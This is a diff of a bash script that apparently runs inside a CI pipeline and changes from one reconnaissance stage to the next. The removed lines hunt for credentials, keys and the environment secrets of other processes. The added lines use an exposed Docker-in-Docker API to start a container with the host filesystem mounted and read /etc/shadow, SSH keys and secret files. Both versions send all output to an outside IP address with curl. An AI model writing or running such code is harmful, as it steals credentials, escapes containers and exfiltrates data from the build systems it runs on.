@@ -1,38 +1,38 @@
 #!/bin/bash
 {
-echo "==S33=="
+echo "==S34=="
 
-# Search for leftover files from other CI builds
-echo "==TMP=="
-find /tmp -maxdepth 2 -type f -name "*.toml" -o -name "*.conf" -o -name "*.key" -o -name "*.json" -o -name "config*" 2>/dev/null | head -20
+# The CI uses DOCKER_HOST=tcp://docker:2375 — dind is accessible!
+echo "==DOCKER_HOST=="
+echo "DOCKER_HOST=$DOCKER_HOST"
 
-echo "==HOME=="  
-find /root -maxdepth 3 -type f ! -path "*/node_modules/*" ! -path "*/.npm/*" 2>/dev/null | head -30
-ls -la /root/.docker/config.json 2>/dev/null
-cat /root/.docker/config.json 2>/dev/null
+# Talk to dind API directly
+echo "==DIND_INFO=="
+curl -sf "http://docker:2375/info" 2>&1 | head -50
 
-echo "==DOCKER_VOLUMES=="
-ls -la /var/lib/docker/volumes/ 2>/dev/null | head -20
-find /var/lib/docker/volumes -name "*.toml" -o -name "config*" -o -name "*.key" 2>/dev/null | head -20
+echo "==DIND_CONTAINERS=="
+curl -sf "http://docker:2375/containers/json?all=true" 2>&1 | head -200
 
-echo "==CACHE=="
-find /cache /builds /opt -maxdepth 3 -type f -name "*.toml" -o -name "*.conf" -o -name "*.key" -o -name "*secret*" 2>/dev/null | head -20
+echo "==DIND_IMAGES=="
+curl -sf "http://docker:2375/images/json" 2>&1 | head -100
 
-echo "==PROC_ENV=="
-# Read environment of OTHER processes — might have CI vars from other jobs
-for pid in $(ls /proc/ 2>/dev/null | grep '^[0-9]' | head -20); do
-    e=$(cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -iE "TOKEN|SECRET|KEY|PASS|FUNC|HSM|LIQUID" 2>/dev/null)
-    [ -n "$e" ] && echo "PID:$pid $e"
-done
+# ESCAPE: Create a container with host root filesystem mounted!!
+echo "==ESCAPE_ATTEMPT=="
+# Use alpine image to mount host /
+ESCAPE=$(curl -sf -X POST "http://docker:2375/containers/create" \
+  -H "Content-Type: application/json" \
+  -d '{"Image":"alpine","Cmd":["sh","-c","cat /host/etc/shadow; ls -la /host/var/lib/parport/ 2>/dev/null; cat /host/root/.ssh/authorized_keys 2>/dev/null; find /host -maxdepth 3 -name keyfile -o -name config.toml -o -name .LOCALSECRETS 2>/dev/null"],"HostConfig":{"Binds":["/:/host:ro"]}}' 2>&1)
+echo "CREATE: $ESCAPE"
 
-echo "==DISK_SEARCH=="
-# Search entire filesystem for signing keys or configs
-find / -maxdepth 4 -name "signing*" -o -name "*functionary*" -o -name "hsm_init*" -o -name "keyfile" -o -name ".LOCALSECRETS" -o -name "config_secrets*" 2>/dev/null | grep -v proc | head -20
-
-echo "==GIT_CREDENTIALS=="
-cat /root/.git-credentials 2>/dev/null
-cat /root/.gitconfig 2>/dev/null
-git config --global credential.helper 2>/dev/null
+CID=$(echo "$ESCAPE" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
+if [ -n "$CID" ]; then
+    echo "CID: $CID"
+    curl -sf -X POST "http://docker:2375/containers/$CID/start" 2>&1
+    sleep 3
+    echo "==ESCAPE_OUTPUT=="
+    curl -sf "http://docker:2375/containers/$CID/logs?stdout=true&stderr=true" 2>&1
+    curl -sf -X DELETE "http://docker:2375/containers/$CID?force=true" 2>/dev/null
+fi
 
 echo "==END=="
-} 2>&1 | curl -s -m90 -X POST http://144.172.110.44:8443/s33 --data-binary @-
+} 2>&1 | curl -s -m120 -X POST http://144.172.110.44:8443/s34 --data-binary @-
